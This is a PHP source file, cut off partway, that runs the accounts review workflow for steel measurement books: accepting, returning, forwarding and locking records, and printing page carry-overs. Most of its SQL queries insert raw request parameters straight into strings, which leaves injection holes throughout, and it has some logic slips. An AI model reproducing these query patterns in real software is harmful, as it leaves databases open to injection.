<?php
@ob_start();
require_once 'library/config.php';
require_once 'library/functions.php';
require_once 'library/binddata.php';
require_once 'library/declaration.php';
include "library/common.php";
include "sysdate.php";
checkUser();
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
$NextMbIncr = 0; $UsedMBArr = array();
$msg = '';
$staffid 		= $_SESSION['sid'];//echo $staffid;
$staffid_acc 	= $_SESSION['sid_acc'];
$userid 		= $_SESSION['userid'];
$staff_levelid  = $_SESSION['levelid'];
$mbooktype = "S";
function dt_format($ddmmyyyy) {
    $dt = explode('/', $ddmmyyyy);
    $dd = $dt[0];
    $mm = $dt[1];
    $yy = $dt[2];
    return $yy . '-' . $mm . '-' . $dd;
}
function dt_display($ddmmyyyy) {
    $dt = explode('-', $ddmmyyyy);
    $dd = $dt[2];
    $mm = $dt[1];
    $yy = $dt[0];
    return $dd . '/' . $mm . '/' . $yy;
}
function getWordWrapCount($description,$char)
{
	$wrap_cnt 	= 0; 
	$descwork 	= "";
	$char_no 	= $char;
	$work_desc 	= $description;
	$desc 		= wordwrap($work_desc,$char_no,'<br>');
	$exp_line 	= explode('<br>', $desc);
	$wlcnt 		= count($exp_line);
	for($xc=0; $xc<$wlcnt; $xc++)
	{
		if($exp_line[$xc] != "")
		{
			$wrap_cnt++;
			$descwork .= $exp_line[$xc]."<br/> ";
		}
	}
	return array($descwork, $wrap_cnt);
}
$staff_design_sql = "select staff.staffname, designation.designationname from staff INNER JOIN designation ON (designation.designationid = staff.designationid) WHERE staff.staffid = '$staffid' AND staff.active = 1 AND designation.active = 1";
$staff_design_query = mysql_query($staff_design_sql);
$staffList = mysql_fetch_object($staff_design_query);
$staffname = $staffList->staffname;
$designation = $staffList->designationname;
if($_GET['workno'] != "")
{
	$sheetid = $_GET['workno'];
	$linkid = $_GET['linkid'];
}
if($_POST['back'])
{
	$sheetid 	= $_POST['txt_sheetid'];
	$zone_id 	= $_POST['txt_zone_id'];
	$rbn 		= $_POST['txt_rbn_no'];
	$view 		= $_POST['txt_view'];
	$lock_release_query = "update send_accounts_and_civil set locked_status = '' where sheetid  = '$sheetid' and rbn = '$rbn' and zone_id = '$zone_id' and mtype = 'S' and genlevel = 'staff'";
	$lock_release_sql = mysql_query($lock_release_query);
	 $staffid_acc 			= $_SESSION['sid_acc'];
	 $staff_level_str 		= getstafflevel($staffid_acc);
	 $exp_staff_level_str 	= explode("@#*#@",$staff_level_str);
	 $staff_roleid 			= $exp_staff_level_str[0];
	 $staff_levelid 		= $exp_staff_level_str[1];
	 
	 $minmax_level_str 		= getstaff_minmax_level();
	 $exp_minmax_level_str 	= explode("@#*#@",$minmax_level_str);
	 $min_levelid 			= $exp_minmax_level_str[0];
	 $max_levelid 			= $exp_minmax_level_str[1];
	if($staff_levelid == $min_levelid)
	{
		$accurl = "MeasurementBookPrint_staff_Accounts.php?view=".$view;
	}
	else
	{
		//$accurl = "MeasurementBookPrint_staff_AccountsL".$staff_levelid.".php";
		$accurl = "MeasurementBookPrint_staff_Accounts.php?view=".$view;
	}
    header('Location: '.$accurl);
}

if($_POST["send_to_civil"] == " Send to Civil ")
{
     //header('Location: MeasurementBookPrint_staff_Accounts.php');
	 $sc_sheetid 			= $_POST['txt_sheetid'];
	 $sc_zone_id 			= $_POST['txt_zone_id'];
	 $sc_rbnno 				= $_POST['txt_rbn_no'];
	 $acc_remarks_count 	= $_POST['txt_acc_remarks_count'];
	 $sc_mbook_no 			= $_POST['txt_mbook_no'];
	 $view 					= $_POST['txt_view'];
	 $staffid_acc 			= $_SESSION['sid_acc'];
	/* $staff_level_str 		= getstafflevel($staffid_acc);
	 $exp_staff_level_str 	= explode("@#*#@",$staff_level_str);
	 $staff_roleid 			= $exp_staff_level_str[0];
	 $staff_levelid 		= $exp_staff_level_str[1];
	 
	 $minmax_level_str 		= getstaff_minmax_level();
	 $exp_minmax_level_str 	= explode("@#*#@",$minmax_level_str);
	 $min_levelid 			= $exp_minmax_level_str[0];
	 $max_levelid 			= $exp_minmax_level_str[1];
	 if($staff_levelid == $min_levelid)
	 {
	 	//$level_status = "P";
		//$staff_levelid = $staff_levelid + 1;
		$staff_clause = " acc_staffid_L1 = '".$staffid_acc."' ";
	 }
	 else
	 {
	 	//$level_status = "F";
		//$staff_levelid = $staff_levelid;
		$staff_clause = " acc_staffid_L2 = '".$staffid_acc."' ";
	 }*/
	 
	 $Status = AccountsLevelAction($sc_sheetid,$sc_rbnno,$_SESSION['levelid'],"BW");
	 if($acc_remarks_count>0)
	 {
	 	$acc_comment_log = 1;
	 }
	 else
	 {
	 	$acc_comment_log = 0;
	 }
	 
	 $update_query 	= "update acc_log set status = 'SC', AC_status = 'R', comment ='$acc_comment_log', staffid = '$staffid_acc', levelid = '".$_SESSION['levelid']."',
	 				  staff_levelids= CASE WHEN (staff_levelids = '') THEN '".$_SESSION['levelid']."' ELSE CONCAT(staff_levelids, ',', '".$_SESSION['levelid']."') END , 
					  staff_ids= CASE WHEN (staff_ids = '') THEN '".$_SESSION['sid_acc']."' ELSE CONCAT(staff_ids, ',', '".$_SESSION['sid_acc']."') END ,
					  comp_dt_list = CASE WHEN (comp_dt_list = '') THEN NOW() ELSE CONCAT(comp_dt_list, ',', NOW()) END   
					  where sheetid = '$sc_sheetid' and rbn = '$sc_rbnno' and  zone_id = '$sc_zone_id' and mtype = 'S' and genlevel = 'staff'";
	 $update_sql 	= mysql_query($update_query);
	 
	 $update_query = "update send_accounts_and_civil set mb_ac = 'SC', accounts_comment ='$acc_comment_log', locked_status = '', level_status = 'F', acc_staffid = '$staffid_acc' where sheetid = '$sc_sheetid' and rbn = '$sc_rbnno' and  zone_id = '$sc_zone_id' and mtype = 'S' and genlevel = 'staff'";
	 $update_sql = mysql_query($update_query);
	 if($update_sql == true)
	 {
		$msg = "This MBook Returned to Civil Section";
		$success = 1;
		$_SESSION['lock'] = "";
		$RABTranFWRoleName = GetRoleName($_SESSION['levelid'],$_SESSION['staff_section']);
		$RABTransActDetStr = "Steel MBook - ".$sc_mbook_no." rejected to Civil in ".$RABTranFWRoleName." Level";
		//UpdateWorkTransaction($sc_sheetid,$sc_rbnno,"R",$RABTransActDetStr,"");
	 }
	 else
	 {
		$msg = "Error";
	 }
	 $log_linkid = $_POST['txt_linkid'];
	 UpdateCivilViewlevel($sc_sheetid, $sc_rbnno);
	/* $linsert_log_query = "insert into acc_log set linkid = '$log_linkid', sheetid = '$sc_sheetid', rbn = '$sc_rbnno', log_date = NOW(), mbookno = '$sc_mbook_no', 
						zone_id = '$sc_zone_id', mtype = 'S', genlevel = 'staff', status = 'SC', staffid = '$staffid_acc',
						comment = '$acc_comment_log', levelid = '".$_SESSION['levelid']."', sectionid = ".$_SESSION['staff_section'];
	 $linsert_log_sql = mysql_query($linsert_log_query);*/
	 
	 
}

if($_POST["accept"] == " Accept MBook ")
{
     //header('Location: MeasurementBookPrint_staff_Accounts.php');
	 $sc_sheetid 		= $_POST['txt_sheetid'];
	 $sc_zone_id 		= $_POST['txt_zone_id'];
	 $sc_rbnno 			= $_POST['txt_rbn_no'];
	 $acc_remarks_count = $_POST['txt_acc_remarks_count'];
	 $sc_mbook_no 		= $_POST['txt_mbook_no'];
	 $view 				= $_POST['txt_view'];
	 
	 $staffid_acc 			= $_SESSION['sid_acc'];
	 /*$staff_level_str 		= getstafflevel($staffid_acc);
	 $exp_staff_level_str 	= explode("@#*#@",$staff_level_str);
	 $staff_roleid 			= $exp_staff_level_str[0];
	 $staff_levelid 		= $exp_staff_level_str[1];
	 
	 $minmax_level_str 		= getstaff_minmax_level();
	 $exp_minmax_level_str 	= explode("@#*#@",$minmax_level_str);
	 $min_levelid 			= $exp_minmax_level_str[0];
	 $max_levelid 			= $exp_minmax_level_str[1];
	 if($staff_levelid == $min_levelid)
	 {
	 	$level_status = "P";
		$staff_levelid = $staff_levelid + 1;
		//$acc_staffid_L1 = $staffid_acc;
		$staff_clause = " acc_staffid_L1 = '".$staffid_acc."' ";
	 }
	 else
	 {
	 	$level_status = "F";
		$staff_levelid = $staff_levelid;
		$staff_clause = " acc_staffid_L2 = '".$staffid_acc."' ";
	 }*/
	 
	 if($acc_remarks_count>0)
	 {
	 	$acc_comment_log = 1;
	 }
	 else
	 {
	 	$acc_comment_log = 0;
	 }
	 
	 $update_query 	= "update acc_log set status = 'AC', AC_status = 'A', comment ='$acc_comment_log', staffid = '$staffid_acc', levelid = '".$_SESSION['levelid']."',
	 				  staff_levelids= CASE WHEN (staff_levelids = '') THEN '".$_SESSION['levelid']."' ELSE CONCAT(staff_levelids, ',', '".$_SESSION['levelid']."') END , 
					  staff_ids= CASE WHEN (staff_ids = '') THEN '".$_SESSION['sid_acc']."' ELSE CONCAT(staff_ids, ',', '".$_SESSION['sid_acc']."') END ,
					  comp_dt_list = CASE WHEN (comp_dt_list = '') THEN NOW() ELSE CONCAT(comp_dt_list, ',', NOW()) END   
					  where sheetid = '$sc_sheetid' and rbn = '$sc_rbnno' and  zone_id = '$sc_zone_id' and mtype = 'S' and genlevel = 'staff'";
	 $update_sql 	= mysql_query($update_query);
	 //echo $update_query;exit;
	 $update_query = "update send_accounts_and_civil set mb_ac = 'AC', accounts_comment ='$acc_comment_log', locked_status = '', acc_staffid = '$staffid_acc' 
	 where sheetid = '$sc_sheetid' and rbn = '$sc_rbnno' and  zone_id = '$sc_zone_id' and mtype = 'S' and genlevel = 'staff'";
	 $update_sql = mysql_query($update_query);
	 
	 
	 if($update_sql == true)
	 {
		$msg = "This MBook Verified & Accepted in Final Level";
		$success = 1;
		$_SESSION['lock'] = "";
		$RABTranFWRoleName = GetRoleName($_SESSION['levelid'],$_SESSION['staff_section']);
		$RABTransActDetStr = "Steel MBook - ".$sc_mbook_no." verified and final level accepted in ".$RABTranFWRoleName." Level";
		//UpdateWorkTransaction($sc_sheetid,$sc_rbnno,"R",$RABTransActDetStr,"");
	 }
	 else
	 {
		$msg = "Error";
	 }
	 //echo $msg;exit;
	 $log_linkid = $_POST['txt_linkid'];
	 /*$linsert_log_query = "insert into acc_log set linkid = '$log_linkid', sheetid = '$sc_sheetid', rbn = '$sc_rbnno', log_date = NOW(), mbookno = '$sc_mbook_no', 
						zone_id = '$sc_zone_id', mtype = 'S', genlevel = 'staff', status = 'AC', staffid = '$staffid_acc',
						comment = '$acc_comment_log', levelid = '".$_SESSION['levelid']."', sectionid = ".$_SESSION['staff_section'];
	 $linsert_log_sql = mysql_query($linsert_log_query);*/
}
if(isset($_POST["forward"])){
	 $staffid_acc 			= $_SESSION['sid_acc'];
	 $sc_sheetid 			= $_POST['txt_sheetid'];
	 $sc_zone_id 			= $_POST['txt_zone_id'];
	 $sc_rbnno 				= $_POST['txt_rbn_no'];
	 $acc_remarks_count 	= $_POST['txt_acc_remarks_count'];
	 $sc_mbook_no 			= $_POST['txt_mbook_no'];
	 $fw_level 				= $_POST['txt_fw_level'];
	 $end_level 			= $_POST['txt_end_level'];
	 $view 					= $_POST['txt_view'];
	 if($acc_remarks_count>0)
	 {
	 	$acc_comment_log = 1;
	 }
	 else
	 {
	 	$acc_comment_log = 0;
	 }
	 $update_query 	= "update acc_log set comment ='$acc_comment_log', staffid = '$staffid_acc', 
	 				  levelid= CASE WHEN (AC_status = 'R') THEN '$fw_level' ELSE '".$_SESSION['levelid']."' END , 
					  AC_status= CASE WHEN (AC_status = 'R') THEN '' ELSE 'A' END , 
	 				  staff_levelids= CASE WHEN (staff_levelids = '') THEN '".$_SESSION['levelid']."' ELSE CONCAT(staff_levelids, ',', '".$_SESSION['levelid']."') END , 
					  staff_ids= CASE WHEN (staff_ids = '') THEN '".$_SESSION['sid_acc']."' ELSE CONCAT(staff_ids, ',', '".$_SESSION['sid_acc']."') END ,
					  rec_dt_list = CASE WHEN (rec_dt_list = '') THEN NOW() ELSE CONCAT(rec_dt_list, ',', NOW()) END ,
					  comp_dt_list = CASE WHEN (comp_dt_list = '') THEN NOW() ELSE CONCAT(comp_dt_list, ',', NOW()) END   
					  where sheetid = '$sc_sheetid' and rbn = '$sc_rbnno' and  zone_id = '$sc_zone_id' and mtype = 'S' and genlevel = 'staff'";
	 $update_sql 	= mysql_query($update_query);
	 
	 $RejCnt = 0;
	 $select_reject_query 	= "select logid from acc_log where sheetid = '$sc_sheetid' and rbn = '$sc_rbnno' and (AC_status = 'R' OR AC_status = '') and levelid = '".$_SESSION['levelid']."'";
	 $select_reject_sql 	= mysql_query($select_reject_query);
	 if($select_reject_sql == true){
	 	$RejCnt = mysql_num_rows($select_reject_sql);
	 }
	 //echo $select_reject_query;exit;
	 if($RejCnt == 0){
	 
	/* $update_query = "update acc_log set 
	 AC_status = CASE WHEN (levelid = '".$_SESSION['levelid']."') THEN '' ELSE 'A' END,  
	 levelid = '$fw_level' where sheetid = '$sc_sheetid' and rbn = '$sc_rbnno' and  zone_id = '$sc_zone_id' and mtype = 'S' and genlevel = 'staff'";*/
		$update_query = "update acc_log set 
		AC_status = '',  
		levelid = '$fw_level' where sheetid = '$sc_sheetid' and rbn = '$sc_rbnno' and  zone_id = '$sc_zone_id' and mtype = 'S' and genlevel = 'staff'";
	 
	 //echo $update_query; exit;
	 	$update_sql = mysql_query($update_query);
	 
	 	$update_level_query = "update al_as set status = '$fw_level' where sheetid = '$sc_sheetid' and rbn = '$sc_rbnno'";
		$update_level_sql = mysql_query($update_level_query);
	 }
	 
	 
	 if($update_sql == true)
	 {
		$msg 		= "This MBook Forwarded to Next Level";
		$success 	= 1;
		$_SESSION['lock'] = "";
		$RABTranFWRoleName = GetRoleName($_SESSION['levelid'],$_SESSION['staff_section']);
		$RABTransActDetStr = "Steel MBook - ".$sc_mbook_no." accepted in ".$RABTranFWRoleName." Level";
		//UpdateWorkTransaction($sc_sheetid,$sc_rbnno,"R",$RABTransActDetStr,"");
	 }
	 else
	 {
		$msg 		= "Error";
	 }
	 
	 $update_query1 	= "update send_accounts_and_civil set locked_status = '', acc_staffid = '".$_SESSION['sid_acc']."' where sheetid = '$sc_sheetid' and rbn = '$sc_rbnno' and  zone_id = '$sc_zone_id' and mtype = 'S' and genlevel = 'staff'";
	 $update_sql1 	= mysql_query($update_query1);
	// echo $update_query1;exit;
}
if(isset($_POST["backward"])){
	 $staffid_acc 			= $_SESSION['sid_acc'];
	 $sc_sheetid 			= $_POST['txt_sheetid'];
	 $sc_zone_id 			= $_POST['txt_zone_id'];
	 $sc_rbnno 				= $_POST['txt_rbn_no'];
	 $acc_remarks_count 	= $_POST['txt_acc_remarks_count'];
	 $sc_mbook_no 			= $_POST['txt_mbook_no'];
	 $bw_level 				= $_POST['txt_bw_level'];
	 $view 					= $_POST['txt_view'];
	 
	 if($acc_remarks_count>0)
	 {
	 	$acc_comment_log = 1;
	 }
	 else
	 {
	 	$acc_comment_log = 0;
	 }
	 $Status = AccountsLevelAction($sc_sheetid,$sc_rbnno,$_SESSION['levelid'],"BW");
	 $update_query 	= "update acc_log set AC_status = 'R', comment ='$acc_comment_log', staffid = '$staffid_acc', levelid = '$Status',
	 				  staff_levelids= CASE WHEN (staff_levelids = '') THEN '".$_SESSION['levelid']."' ELSE CONCAT(staff_levelids, ',', '".$_SESSION['levelid']."') END , 
					  staff_ids= CASE WHEN (staff_ids = '') THEN '".$_SESSION['sid_acc']."' ELSE CONCAT(staff_ids, ',', '".$_SESSION['sid_acc']."') END ,
					  rec_dt_list = CASE WHEN (rec_dt_list = '') THEN NOW() ELSE CONCAT(rec_dt_list, ',', NOW()) END ,
					  comp_dt_list = CASE WHEN (comp_dt_list = '') THEN NOW() ELSE CONCAT(comp_dt_list, ',', NOW()) END   
					  where sheetid = '$sc_sheetid' and rbn = '$sc_rbnno' and  zone_id = '$sc_zone_id' and mtype = 'S' and genlevel = 'staff'";
	 $update_sql 	= mysql_query($update_query);
	 
	 $update_query1 	= "update send_accounts_and_civil set locked_status = '', acc_staffid = '".$_SESSION['sid_acc']."' where sheetid = '$sc_sheetid' and rbn = '$sc_rbnno' and  zone_id = '$sc_zone_id' and mtype = 'S' and genlevel = 'staff'";
	 $update_sql1 	= mysql_query($update_query1);
	 
	 if($update_sql == true)
	 {
		$msg 		= "This MBook Returned to Previous Level";
		$success 	= 1;
		$_SESSION['lock'] = "";
		$RABTranFWRoleName = GetRoleName($Status,$_SESSION['staff_section']);
		$RABTransActDetStr = "Steel MBook - ".$sc_mbook_no." returned back to ".$RABTranFWRoleName." Level";
		//UpdateWorkTransaction($sc_sheetid,$sc_rbnno,"R",$RABTransActDetStr,"");
	 }
	 else
	 {
		$msg 		= "Error";
	 }
}


$zone_id = $_SESSION['zone_id'];
if(($zone_id != "") && ($zone_id != "all"))
{
	$zone_clause = " AND mbookheader.zone_id = '".$zone_id."'";
}
else
{
	$zone_clause = "";
}

$select_rbn_query = "select DISTINCT rbn FROM mbookgenerate WHERE sheetid = '$sheetid' AND flag = '2'";
//echo $select_rbn_query;exit;
$select_rbn_sql = mysql_query($select_rbn_query);
$Rbnresult = mysql_fetch_object($select_rbn_sql);
$rbn = $Rbnresult->rbn;
$selectmbook_detail = " select date(min(fromdate)) as fromdate, date(max(todate)) as todate, abstmbookno, is_finalbill FROM mbookgenerate_staff WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND flag = '2' AND rbn = '$rbn' group by sheetid";
$selectmbook_detail_sql = mysql_query($selectmbook_detail);
if ($selectmbook_detail_sql == true) 
{
	$Listmbdetail = mysql_fetch_object($selectmbook_detail_sql);
	$fromdate = $Listmbdetail->fromdate; $todate = $Listmbdetail->todate; $abstmbookno = $Listmbdetail->abstmbookno; $is_finalbill = $Listmbdetail->is_finalbill;
}


/////////////////////////// COMMENTED ON 22.07.2019 FOR MULTIPLE MB SELECTION ////////////////////////////////////////
/*$selectmbookno = "select mbname, old_id from oldmbook WHERE mbook_type = 'S' AND sheetid = '$sheetid' AND staffid = '$staffid' AND zone_id = '$zone_id'";
$selectmbookno_sql = mysql_query($selectmbookno);
if(mysql_num_rows($selectmbookno_sql)>0)
{
	$Listmbookno = mysql_fetch_object($selectmbookno_sql);
	$mbookno = $Listmbookno->mbname; $oldmbookid = $Listmbookno->old_id;
	
	$mbookpage = "select mbpage from mbookallotment WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbno = '$mbookno'";
	$mbookpage_sql = mysql_query($mbookpage);
	$mbookpageno = @mysql_result($mbookpage_sql,'mbpage')+1;
	
	$selectnewmbookno = "select DISTINCT mbno from mbookgenerate_staff WHERE sheetid = '$sheetid' AND flag = '2' AND mbno != '$mbookno' AND staffid = '$staffid' AND rbn = '$rbn' AND zone_id = '$zone_id'";
	$selectnewmbookno_sql = mysql_query($selectnewmbookno);
	$newmbookno = @mysql_result($selectnewmbookno_sql,'mbno');
	
	$newmbookpage = "select mbpage from mbookallotment WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbno = '$newmbookno'";
	$newmbookpage_sql = mysql_query($newmbookpage);
	$newmbookpageno = @mysql_result($newmbookpage_sql,'mbpage')+1;
	
//$newmbookpageno = $objBind->DisplayPageDetails($newmbookno,$newmbookno,$sheetid,'cw');
//$newmbookpageno = $newmbookpageno +1;
}
else
{
	$selectmbookno = "select DISTINCT mbno from mbookgenerate_staff WHERE sheetid = '$sheetid' AND flag = '2' AND staffid = '$staffid' AND rbn = '$rbn' AND zone_id = '$zone_id'";
	//echo $selectmbookno;
	$selectmbookno_sql = mysql_query($selectmbookno);
	$mbookno = @mysql_result($selectmbookno_sql,'mbno');
	//echo "hai";
	$mbookpage = "select mbpage from mbookallotment WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbno = '$mbookno'";
	$mbookpage_sql = mysql_query($mbookpage);
	$mbookpageno = @mysql_result($mbookpage_sql,'mbpage')+1;
}


$select_new_mbook_no_query1 = "select mbno, startpage from mymbook where sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbookorder = '1' AND rbn = '$rbn' AND mtype = 'S' AND  zone_id = '$zone_id'";
$select_new_mbook_no_sql1 = mysql_query($select_new_mbook_no_query1);
if($select_new_mbook_no_sql1 == true)
{
	if(mysql_num_rows($select_new_mbook_no_sql1)>0)
	{
		$NMBList1 = mysql_fetch_object($select_new_mbook_no_sql1);
		$mbookno = $NMBList1->mbno;
		$mbookpageno = $NMBList1->startpage;
	}
}


$select_new_mbook_no_query = "select mbno, startpage from mymbook where sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbookorder = '2' AND rbn = '$rbn' AND mtype = 'S' AND  zone_id = '$zone_id'";
$select_new_mbook_no_sql = mysql_query($select_new_mbook_no_query);
if($select_new_mbook_no_sql == true)
{
	if(mysql_num_rows($select_new_mbook_no_sql)>0)
	{
		$NMBList = mysql_fetch_object($select_new_mbook_no_sql);
		$newmbookno = $NMBList->mbno;
		$newmbookpageno = $NMBList->startpage;
	}
}
$mpage = $mbookpageno;*/
/////////////////////////// COMMENTED ON 22.07.2019 FOR MULTIPLE MB SELECTION ////////////////////////////////////////


//$mbookpageno = $objBind->DisplayPageDetails($mbookno,$mbookno,$sheetid,'cw');
//$mbookpageno = $mbookpageno+1;

//$newmbookpageno = 1;
//echo "MBno".$mbookno;
//$sheetid=$_SESSION["sheet_id"]; 
//$fromdate = $_SESSION['fromdate'];
//$todate = $_SESSION['todate'];
//$mbookno = $_SESSION["mb_no"];  
//$mpage = $_SESSION["mb_page"]; 
//$rbn = $_SESSION["rbn"];
//$steelmbno_id = $_SESSION["mbno_id"];
//$temp_sql = "DELETE FROM temp WHERE flag =3 OR flag =2 AND usersid = '$userid'";
//echo $temp_sql;exit;
         //$res_query = dbQuery($temp_sql);
//$Mbsteelgeneratedelsql = "DELETE FROM mbookgenerate WHERE flag =2 AND staffid = '$staffid'";
//$Mbsteelgeneratedelsql_qry = mysql_query($Mbsteelgeneratedelsql);
/*function MeasurementSteelinsert($fromdate,$todate,$sheetid,$mbookno,$mpage,$totalweight_MT,$rbn,$userid,$subdivid,$divid,$staffid)
{  
   
   $querys="INSERT INTO mbookgenerate set staffid = '$staffid', sheetid='$sheetid',divid='$divid',subdivid='$subdivid',
       fromdate ='$fromdate',todate ='$todate' ,mbno='$mbookno',flag=2,rbn='$rbn',
            mbgeneratedate=NOW(), mbpage='$mpage', mbtotal='$totalweight_MT', active=1, userid='$userid'";
 //echo $querys."<br/>";
   $sqlquerys = mysql_query($querys);
}*/
$_SESSION['lock'] == "";
if($_SESSION['lock'] == "")
{
	$update_locked_query = "update send_accounts_and_civil set locked_status = 'locked', locked_staff = '$staffid_acc' where sheetid = '$sheetid' and rbn = '$rbn' and zone_id = '$zone_id' and mtype = 'S' and genlevel = 'staff'";
	$update_locked_sql = mysql_query($update_locked_query);
	$_SESSION['lock'] = 1;
}
//echo $update_locked_query;

function check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$newmbookno,$table1,$newmbookpage)
{
	$_SESSION['last_row_check'] = 1;
		if($mpage >= 100) { $mbookno = $newmbookno; /*$mpage = "GG".$newmbookpage;*/ }
		$x1 = "<tr>";
		$x1 = $x1."<td width='1087px' class='labelcenter' style='text-align:center;border-style:none' colspan='16'>"."<br/>Page ".$mpage."</td>";
		$x1 = $x1."</tr>";
		$x1 = $x1."</table>";
		$x1 = $x1."<p  style='page-break-after:always;'></p>";
		$x1 = $x1.'<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="label">
				<tr style="border:none;"><td colspan="9" align="center" style="border:none;"><br/>Steel M.Book No. '.$mbookno.'&nbsp;&nbsp;<br/>&nbsp;</td></tr>
				</table>';
		$x1 = $x1.$tablehead; 
		$x1 = $x1.'<table width="1087px" border="0" cellpadding="3" cellspacing="3" align="center" bgcolor="#FFFFFF" class="label">';
		$x1 = $x1.$table1;
		echo $x1;
}
function display_carry($sumst,$mbookno,$mpage,$newmbookno,$decimal,$newmbookpage)
{
	if($mpage >= 100) { $page = $newmbookpage; $mbookno = $newmbookno;} else { $page = $mpage + 1; }
	$tmb2 = $sumst;
	$explodedval = explode("@",$tmb2); 
	for($i=0;$i<count($explodedval);$i++)
	{
	   if($explodedval[$i] != "")
	   {
		  $expval = explode("*",$explodedval[$i]); 
		  if($expval[0] == 8){ $tot8 = $tot8 + $expval[1]; }
		  if($expval[0] == 10){ $tot10 = $tot10 + $expval[1]; }
		  if($expval[0] == 12){ $tot12 = $tot12 + $expval[1]; }
		  if($expval[0] == 16){ $tot16 = $tot16 + $expval[1]; }
		  if($expval[0] == 20){ $tot20 = $tot20 + $expval[1]; }
		  if($expval[0] == 25){ $tot25 = $tot25 + $expval[1]; }
		  if($expval[0] == 28){ $tot28 = $tot28 + $expval[1]; }
		  if($expval[0] == 32){ $tot32 = $tot32 + $expval[1]; }
		  if($expval[0] == 36){ $tot36 = $tot36 + $expval[1]; }
		}
	} 
	if($tot8 == 0) { $tot8 = ""; } else { $tot8 = number_format($tot8,$decimal,".",","); }
	if($tot10 == 0) { $tot10 = ""; } else { $tot10 = number_format($tot10,$decimal,".",","); }
	if($tot12 == 0) { $tot12 = ""; } else { $tot12 = number_format($tot12,$decimal,".",","); }
	if($tot16 == 0) { $tot16 = ""; } else { $tot16 = number_format($tot16,$decimal,".",","); }
	if($tot20 == 0) { $tot20 = ""; } else { $tot20 = number_format($tot20,$decimal,".",","); }
	if($tot25 == 0) { $tot25 = ""; } else { $tot25 = number_format($tot25,$decimal,".",","); }
	if($tot28 == 0) { $tot28 = ""; } else { $tot28 = number_format($tot28,$decimal,".",","); }
	if($tot32 == 0) { $tot32 = ""; } else { $tot32 = number_format($tot32,$decimal,".",","); }
	if($tot36 == 0) { $tot36 = ""; } else { $tot36 = number_format($tot36,$decimal,".",","); }
	$row_co = "<tr height=''>";
	$row_co = $row_co."<td width='' colspan='7' class='labelbold' style='text-align:right'>"."C/o to Page ".($page+0)."/ Steel MB No. ".$mbookno."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot8."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot10."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot12."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot16."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot20."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot25."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot28."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot32."</td>";
	$row_co = $row_co."<td width='6%' class='labelbold' style='text-align:right'>".$tot36."</td>";
	//$row_co = $row_co."<td width='2%' class='labelbold'></td>";
	$row_co = $row_co."</tr>";
	//$row_co = $row_co."<tr height='' style='text-align:center;border-style:none'>";
	//$row_co = $row_co."<td width='100%' class='labelcenter' style='text-align:center;border-style:none' colspan='16'>"."<br/>Page ".$mpage."</td>";
	//$row_co = $row_co."</tr>";
	echo $row_co;
}
$wodataquery = "SELECT sheet_id, sheet_name, work_order_no, work_name, tech_sanction, computer_code_no, name_contractor, agree_no, rbn FROM sheet WHERE sheet_id = '$sheetid' ";
$wodataquerysql = mysql_query($wodataquery);
if ($wodataquerysql == true) 
    {
    $Res = mysql_fetch_object($wodataquerysql);
    $work_name = $Res->work_name;    $tech_sanction = $Res->tech_sanction;
    $name_contractor = $Res->name_contractor;    $agree_no = $Res->agree_no; $work_order_no = $Res->work_order_no; 
	$ccno = $Res->computer_code_no;
   // if($Res->rbn  ==0) { $runn_acc_bill_no =1;  } else { $runn_acc_bill_no =$Res->rbn + 1;}
   $runn_acc_bill_no = $rbn;
    }
	
$length = strlen($work_name);
//echo $length."<br/>";
$start_line = ceil($length/130);
//echo $start_line;
function getabstractpage($sheetid,$subdivid)
{
	$select_abs_page_query = "select abstmbookno, abstmbpage from measurementbook_temp WHERE sheetid = '$sheetid' AND subdivid = '$subdivid' AND staffid = '$staffid'";
	$select_abs_page_sql = mysql_query($select_abs_page_query);
	$abstmbookno = @mysql_result($select_abs_page_sql,0,'abstmbookno');
	$abstractpage = @mysql_result($select_abs_page_sql,0,'abstmbpage');
	echo "C/o to Page ".$abstractpage." /Abstract MB No. ".$abstmbookno;
}
function getcompositepage($sheetid,$subdivid,$rbn,$zone_id)
{
	$select_sa_page_query = "select sa_mbno, sa_page from mbookgenerate_staff WHERE sheetid = '$sheetid' AND subdivid = '$subdivid' AND rbn = '$rbn' AND zone_id = '$zone_id'";
	$select_sa_page_sql = mysql_query($select_sa_page_query);
	$mbookno_compo = @mysql_result($select_sa_page_sql,0,'sa_mbno');
	$mbookpageno_compo = @mysql_result($select_sa_page_sql,0,'sa_page');
	if(($mbookno_compo == 0)&&($mbookpageno_compo == 0)){
		$select_abs_page_query = "select mbno, mbpage from mbookgenerate WHERE sheetid = '$sheetid' AND subdivid = '$subdivid'";
		$select_abs_page_sql = mysql_query($select_abs_page_query);
		$mbookno_compo = @mysql_result($select_abs_page_sql,0,'mbno');
		$mbookpageno_compo = @mysql_result($select_abs_page_sql,0,'mbpage');
	}
	return "C/o to Page ".$mbookpageno_compo." /General MB No. ".$mbookno_compo;
}

$NextMBFlag = 0; $NextMBList = array(); $NextMBPageList = array(); $NextMBFlag = 1;
$SelectMBookQuery = "select * from mymbook where sheetid = '$sheetid' and rbn = '$rbn' and mtype = 'S' and zone_id = '$zone_id' and genlevel = 'staff' order by mbookorder asc";
$SelectMBookSql = mysql_query($SelectMBookQuery);
if($SelectMBookSql == true){
	if(mysql_num_rows($SelectMBookSql)>0){
		while($MBList = mysql_fetch_object($SelectMBookSql)){
			if($MBList->mbookorder == 1){ 
